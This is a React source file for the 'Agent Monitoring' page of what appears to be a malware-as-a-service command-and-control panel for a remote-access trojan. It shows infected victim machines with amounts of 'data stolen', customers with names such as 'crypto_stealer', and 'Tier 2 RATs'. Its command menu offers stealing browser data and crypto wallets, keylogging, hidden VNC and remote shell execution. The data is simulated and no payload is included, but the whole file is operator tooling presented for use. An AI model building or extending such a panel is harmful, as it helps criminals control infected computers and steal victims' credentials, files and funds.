import React, { useState, useEffect } from 'react';
import { 
  Activity, 
  Search, 
  Filter, 
  Terminal, 
  Eye, 
  Power, 
  AlertCircle,
  CheckCircle,
  Clock,
  Globe,
  Monitor,
  HardDrive,
  Cpu,
  Send,
  Download,
  Upload,
  Shield,
  Crown,
  ChevronDown,
  MoreHorizontal,
  Play,
  Square,
  RefreshCw
} from 'lucide-react';

const Agents = () => {
  const [agents, setAgents] = useState([]);
  const [filteredAgents, setFilteredAgents] = useState([]);
  const [searchTerm, setSearchTerm] = useState('');
  const [selectedTier, setSelectedTier] = useState('all');
  const [selectedStatus, setSelectedStatus] = useState('all');
  const [showFilters, setShowFilters] = useState(false);
  const [selectedAgent, setSelectedAgent] = useState(null);
  const [showCommandModal, setShowCommandModal] = useState(false);
  const [command, setCommand] = useState('');
  const [commandHistory, setCommandHistory] = useState([]);

  useEffect(() => {
    fetchAgents();
    const interval = setInterval(fetchAgents, 10000); // Update every 10 seconds
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    filterAgents();
  }, [agents, searchTerm, selectedTier, selectedStatus]);

  const fetchAgents = async () => {
    // Simulated data - replace with actual API call
    const mockAgents = [
      {
        id: 'agent_001',
        hostname: 'DESKTOP-USER1',
        ip: '192.168.1.100',
        country: 'United States',
        os: 'Windows 11 Pro',
        tier: 1,
        status: 'online',
        lastSeen: new Date().toISOString(),
        connectedTime: '2h 45m',
        privileges: 'User',
        customer: 'darknet_user1',
        cpu: '45%',
        memory: '62%',
        disk: '78%',
        commands: 12,
        dataStolen: '2.3 GB'
      },
      {
        id: 'agent_002',
        hostname: 'WORKSTATION-CORP',
        ip: '10.0.0.45',
        country: 'Germany',
        os: 'Windows 10 Enterprise',
        tier: 2,
        status: 'online',
        lastSeen: new Date().toISOString(),
        connectedTime: '1h 20m',
        privileges: 'Admin',
        customer: 'elite_hacker',
        cpu: '23%',
        memory: '34%',
        disk: '45%',
        commands: 67,
        dataStolen: '15.7 GB'
      },
      {
        id: 'agent_003',
        hostname: 'LAPTOP-HOME',
        ip: '192.168.0.55',
        country: 'United Kingdom',
        os: 'Windows 11 Home',
        tier: 1,
        status: 'offline',
        lastSeen: new Date(Date.now() - 300000).toISOString(),
        connectedTime: '0m',
        privileges: 'User',
        customer: 'crypto_stealer',
        cpu: '0%',
        memory: '0%',
        disk: '0%',
        commands: 3,
        dataStolen: '450 MB'
      }
    ];
    setAgents(mockAgents);
  };

  const filterAgents = () => {
    let filtered = agents;

    if (searchTerm) {
      filtered = filtered.filter(agent =>
        agent.hostname.toLowerCase().includes(searchTerm.toLowerCase()) ||
        agent.ip.includes(searchTerm) ||
        agent.customer.toLowerCase().includes(searchTerm.toLowerCase())
      );
    }

    if (selectedTier !== 'all') {
      filtered = filtered.filter(agent => agent.tier === parseInt(selectedTier));
    }

    if (selectedStatus !== 'all') {
      filtered = filtered.filter(agent => agent.status === selectedStatus);
    }

    setFilteredAgents(filtered);
  };

  const handleSendCommand = (agent) => {
    setSelectedAgent(agent);
    setShowCommandModal(true);
  };

  const executeCommand = () => {
    if (!command.trim()) return;

    const newCommand = {
      id: Date.now(),
      agentId: selectedAgent.id,
      command: command,
      timestamp: new Date().toISOString(),
      status: 'sent'
    };

    setCommandHistory([...commandHistory, newCommand]);
    setCommand('');
    setShowCommandModal(false);
  };

  const getStatusBadge = (status) => {
    const statusConfig = {
      online: { color: 'bg-green-100 text-green-700', text: 'Online', icon: CheckCircle },
      offline: { color: 'bg-red-100 text-red-700', text: 'Offline', icon: AlertCircle },
      idle: { color: 'bg-yellow-100 text-yellow-700', text: 'Idle', icon: Clock }
    };

    const config = statusConfig[status] || statusConfig.offline;
    const Icon = config.icon;
    
    return (
      <span className={`inline-flex items-center gap-1 px-2 py-1 rounded-full text-xs font-medium ${config.color}`}>
        <Icon className="w-3 h-3" />
        {config.text}
      </span>
    );
  };

  const getTierBadge = (tier) => {
    if (tier === 1) {
      return (
        <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full text-xs font-medium bg-blue-100 text-blue-700">
          <Shield className="w-3 h-3" />
          Tier 1
        </span>
      );
    } else {
      return (
        <span className="inline-flex items-center gap-1 px-2 py-1 rounded-full text-xs font-medium bg-purple-100 text-purple-700">
          <Crown className="w-3 h-3" />
          Tier 2
        </span>
      );
    }
  };

  const getPrivilegeBadge = (privileges) => {
    const isAdmin = privileges === 'Admin';
    return (
      <span className={`inline-flex items-center px-2 py-1 rounded-full text-xs font-medium ${
        isAdmin ? 'bg-red-100 text-red-700' : 'bg-gray-100 text-gray-700'
      }`}>
        {privileges}
      </span>
    );
  };

  const CommandModal = ({ isOpen, onClose, agent }) => {
    if (!isOpen) return null;

    const tier1Commands = [
      'browsers - Steal browser data',
      'wallets - Steal crypto wallets',
      'files - Grab user files',
      'screenshot - Take screenshot'
    ];

    const tier2Commands = [
      'shell [command] - Execute shell command',
      'keylog_start - Start keylogger',
      'keylog_stop - Stop keylogger',
      'hvnc_start - Start HVNC session',
      'processes - List running processes',
      'upload [file] - Upload file to target',
      'download [file] - Download file from target'
    ];

    const availableCommands = agent?.tier === 2 ? [...tier1Commands, ...tier2Commands] : tier1Commands;

    return (
      <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
        <div className="bg-white rounded-xl shadow-2xl w-full max-w-2xl max-h-[80vh] overflow-hidden">
          <div className="flex items-center justify-between p-6 border-b border-slate-200">
            <div>
              <h3 className="text-lg font-semibold text-slate-900">Command Interface</h3>
              <p className="text-sm text-slate-600">Agent: {agent?.hostname} ({agent?.ip})</p>
            </div>
            <button
              onClick={onClose}
              className="p-2 hover:bg-slate-100 rounded-lg transition-colors"
            >
              <Square className="w-5 h-5 text-slate-500" />
            </button>
          </div>
          
          <div className="p-6 space-y-4">
            {/* Available Commands */}
            <div>
              <h4 className="font-medium text-slate-900 mb-3">Available Commands</h4>
              <div className="bg-slate-50 rounded-lg p-4 max-h-40 overflow-y-auto">
                <div className="space-y-1 text-sm font-mono">
                  {availableCommands.map((cmd, index) => (
                    <div key={index} className="text-slate-700">
                      {cmd}
                    </div>
                  ))}
                </div>
              </div>
            </div>

            {/* Command Input */}
            <div>
              <label className="block text-sm font-medium text-slate-700 mb-2">
                Command
              </label>
              <div className="flex gap-2">
                <input
                  type="text"
                  value={command}
                  onChange={(e) => setCommand(e.target.value)}
                  placeholder="Enter command..."
                  className="flex-1 px-3 py-2 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 font-mono"
                  onKeyPress={(e) => e.key === 'Enter' && executeCommand()}
                />
                <button
                  onClick={executeCommand}
                  className="flex items-center gap-2 px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
                >
                  <Send className="w-4 h-4" />
                  Send
                </button>
              </div>
            </div>

            {/* Command History */}
            <div>
              <h4 className="font-medium text-slate-900 mb-3">Recent Commands</h4>
              <div className="bg-slate-900 rounded-lg p-4 max-h-40 overflow-y-auto">
                <div className="space-y-2 text-sm font-mono">
                  {commandHistory
                    .filter(cmd => cmd.agentId === agent?.id)
                    .slice(-10)
                    .map((cmd) => (
                      <div key={cmd.id} className="text-green-400">
                        <span className="text-slate-400">$ </span>
                        {cmd.command}
                      </div>
                    ))}
                  {commandHistory.filter(cmd => cmd.agentId === agent?.id).length === 0 && (
                    <div className="text-slate-500">No commands sent yet...</div>
                  )}
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  };

  return (
    <div className="p-6 space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-slate-900">Agent Monitoring</h1>
          <p className="text-slate-600 mt-1">Monitor and control your active agents in real-time</p>
        </div>
        <div className="flex items-center gap-2">
          <button
            onClick={fetchAgents}
            className="flex items-center gap-2 px-4 py-2 border border-slate-300 rounded-lg hover:bg-slate-50 transition-colors"
          >
            <RefreshCw className="w-4 h-4" />
            Refresh
          </button>
        </div>
      </div>

      {/* Stats Cards */}
      <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
        <div className="bg-white rounded-xl shadow-sm border border-slate-200 p-6">
          <div className="flex items-center gap-3">
            <div className="p-2 bg-green-100 rounded-lg">
              <Activity className="w-5 h-5 text-green-600" />
            </div>
            <div>
              <p className="text-2xl font-bold text-slate-900">
                {agents.filter(a => a.status === 'online').length}
              </p>
              <p className="text-slate-600 text-sm">Online Agents</p>
            </div>
          </div>
        </div>
        <div className="bg-white rounded-xl shadow-sm border border-slate-200 p-6">
          <div className="flex items-center gap-3">
            <div className="p-2 bg-blue-100 rounded-lg">
              <Monitor className="w-5 h-5 text-blue-600" />
            </div>
            <div>
              <p className="text-2xl font-bold text-slate-900">{agents.length}</p>
              <p className="text-slate-600 text-sm">Total Agents</p>
            </div>
          </div>
        </div>
        <div className="bg-white rounded-xl shadow-sm border border-slate-200 p-6">
          <div className="flex items-center gap-3">
            <div className="p-2 bg-purple-100 rounded-lg">
              <Crown className="w-5 h-5 text-purple-600" />
            </div>
            <div>
              <p className="text-2xl font-bold text-slate-900">
                {agents.filter(a => a.tier === 2).length}
              </p>
              <p className="text-slate-600 text-sm">Tier 2 RATs</p>
            </div>
          </div>
        </div>
        <div className="bg-white rounded-xl shadow-sm border border-slate-200 p-6">
          <div className="flex items-center gap-3">
            <div className="p-2 bg-orange-100 rounded-lg">
              <Download className="w-5 h-5 text-orange-600" />
            </div>
            <div>
              <p className="text-2xl font-bold text-slate-900">
                {agents.reduce((sum, a) => sum + parseFloat(a.dataStolen.replace(/[^\d.]/g, '')), 0).toFixed(1)} GB
              </p>
              <p className="text-slate-600 text-sm">Data Stolen</p>
            </div>
          </div>
        </div>
      </div>

      {/* Filters and Search */}
      <div className="bg-white rounded-xl shadow-sm border border-slate-200 p-6">
        <div className="flex flex-col lg:flex-row gap-4 items-center justify-between">
          <div className="flex flex-1 gap-4 w-full lg:w-auto">
            <div className="relative flex-1 lg:max-w-sm">
              <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 w-4 h-4" />
              <input
                type="text"
                placeholder="Search agents..."
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                className="w-full pl-10 pr-4 py-2 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
              />
            </div>
            <button
              onClick={() => setShowFilters(!showFilters)}
              className="flex items-center gap-2 px-4 py-2 border border-slate-300 rounded-lg hover:bg-slate-50 transition-colors"
            >
              <Filter className="w-4 h-4" />
              Filters
              <ChevronDown className={`w-4 h-4 transition-transform ${showFilters ? 'rotate-180' : ''}`} />
            </button>
          </div>
        </div>

        {/* Filter Controls */}
        {showFilters && (
          <div className="mt-4 pt-4 border-t border-slate-200">
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
              <div>
                <label className="block text-sm font-medium text-slate-700 mb-2">
                  Tier
                </label>
                <select
                  value={selectedTier}
                  onChange={(e) => setSelectedTier(e.target.value)}
                  className="w-full px-3 py-2 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                >
                  <option value="all">All Tiers</option>
                  <option value="1">Tier 1</option>
                  <option value="2">Tier 2</option>
                </select>
              </div>
              <div>
                <label className="block text-sm font-medium text-slate-700 mb-2">
                  Status
                </label>
                <select
                  value={selectedStatus}
                  onChange={(e) => setSelectedStatus(e.target.value)}
                  className="w-full px-3 py-2 border border-slate-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                >
                  <option value="all">All Status</option>
                  <option value="online">Online</option>
                  <option value="offline">Offline</option>
                  <option value="idle">Idle</option>
                </select>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Agents Table */}
      <div className="bg-white rounded-xl shadow-sm border border-slate-200 overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full">
            <thead className="bg-slate-50 border-b border-slate-200">
              <tr>
                <th className="text-left p-4 font-medium text-slate-700">Agent</th>
                <th className="text-left p-4 font-medium text-slate-700">Status</th>
                <th className="text-left p-4 font-medium text-slate-700">Tier</th>
                <th className="text-left p-4 font-medium text-slate-700">System</th>
                <th className="text-left p-4 font-medium text-slate-700">Performance</th>
                <th className="text-left p-4 font-medium text-slate-700">Activity</th>
                <th className="text-left p-4 font-medium text-slate-700">Actions</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-200">
              {filteredAgents.map((agent) => (
                <tr key={agent.id} className="hover:bg-slate-50 transition-colors">
                  <td className="p-4">
                    <div>
                      <div className="font-medium text-slate-900">{agent.hostname}</div>
                      <div className="text-sm text-slate-500">{agent.ip} • {agent.country}</div>
                      <div className="text-xs text-slate-400">{agent.customer}</div>
                    </div>
                  </td>
                  <td className="p-4">
                    <div className="space-y-1">
                      {getStatusBadge(agent.status)}
                      <div className="text-xs text-slate-500">{agent.connectedTime}</div>
                    </div>
                  </td>
                  <td className="p-4">
                    <div className="space-y-1">
                      {getTierBadge(agent.tier)}
                      {getPrivilegeBadge(agent.privileges)}
                    </div>
                  </td>
                  <td className="p-4">
                    <div className="text-sm text-slate-600">{agent.os}</div>
                  </td>
                  <td className="p-4">
                    <div className="space-y-1 text-xs">
                      <div className="flex items-center gap-2">
                        <Cpu className="w-3 h-3 text-slate-400" />
                        <span>CPU: {agent.cpu}</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <Activity className="w-3 h-3 text-slate-400" />
                        <span>RAM: {agent.memory}</span>
                      </div>
                      <div className="flex items-center gap-2">
                        <HardDrive className="w-3 h-3 text-slate-400" />
                        <span>Disk: {agent.disk}</span>
                      </div>
                    </div>
                  </td>
                  <td className="p-4">
                    <div className="text-sm">
                      <div className="text-slate-900">{agent.commands} commands</div>
                      <div className="text-slate-500">{agent.dataStolen} stolen</div>
                    </div>
                  </td>
                  <td className="p-4">
                    <div className="flex items-center gap-2">
                      <button
                        onClick={() => handleSendCommand(agent)}
                        disabled={agent.status === 'offline'}
                        className="p-2 text-slate-600 hover:text-blue-600 hover:bg-blue-50 rounded-lg transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                      >
                        <Terminal className="w-4 h-4" />
                      </button>
                      <button className="p-2 text-slate-600 hover:text-green-600 hover:bg-green-50 rounded-lg transition-colors">
                        <Eye className="w-4 h-4" />
                      </button>
                      <button className="p-2 text-slate-600 hover:text-slate-900 hover:bg-slate-100 rounded-lg transition-colors">
                        <MoreHorizontal className="w-4 h-4" />
                      </button>
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {/* Command Modal */}
      <CommandModal
        isOpen={showCommandModal}
        onClose={() => setShowCommandModal(false)}
        agent={selectedAgent}
      />
    </div>
  );
};

export default Agents; 